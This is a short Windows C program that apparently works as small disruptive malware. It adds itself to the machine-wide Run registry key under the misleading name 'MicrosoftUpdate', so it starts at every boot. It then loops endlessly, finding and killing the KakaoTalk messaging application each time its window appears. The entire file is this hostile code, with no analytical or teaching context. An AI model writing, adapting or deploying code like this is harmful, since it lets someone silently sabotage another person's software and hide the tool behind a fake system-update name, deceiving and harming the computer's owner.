#include <windows.h>

#define TITLE_KAKAO	"Ä«Ä«¿ÀÅå"
#define START_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

void Kill_KaKaoTalk();
void Set_Regedit();


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdParam, int nCmdShow)
{
	Set_Regedit();
	Kill_KaKaoTalk();

	return 0;
}


void Kill_KaKaoTalk()
{

	HWND hWnd = 0;
	DWORD dwPID = 0;
	HANDLE hProcess = 0;

	while(1)
	{

		Sleep(1000);
		hWnd = FindWindowA(NULL,TITLE_KAKAO);


		if( hWnd != NULL)
		{
				GetWindowThreadProcessId(hWnd,&dwPID);
				hProcess = OpenProcess(PROCESS_ALL_ACCESS,false,dwPID);

				if(hProcess != NULL)	TerminateProcess(hProcess,0);
		}
	}
}

void Set_Regedit(){

	char sPath[MAX_PATH] = {0};
	char sFullPath[MAX_PATH] = {0};

	GetModuleFileNameA(GetModuleHandle(NULL),sPath,MAX_PATH);

	HKEY hKey;
	RECT rt;
	DWORD dwDisp;
	DWORD Size;

	int nRet = 0;

	nRet = RegCreateKeyExA(HKEY_LOCAL_MACHINE,START_PATH,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,&dwDisp);

	char sBuf[MAX_PATH];
	DWORD dwSize = 0;
	dwSize = MAX_PATH;
	
	nRet =  RegSetValueExA(hKey,"MicrosoftUpdate",0,REG_SZ,(LPBYTE)sPath,strlen(sPath)+1);
	
	RegCloseKey(hKey);


}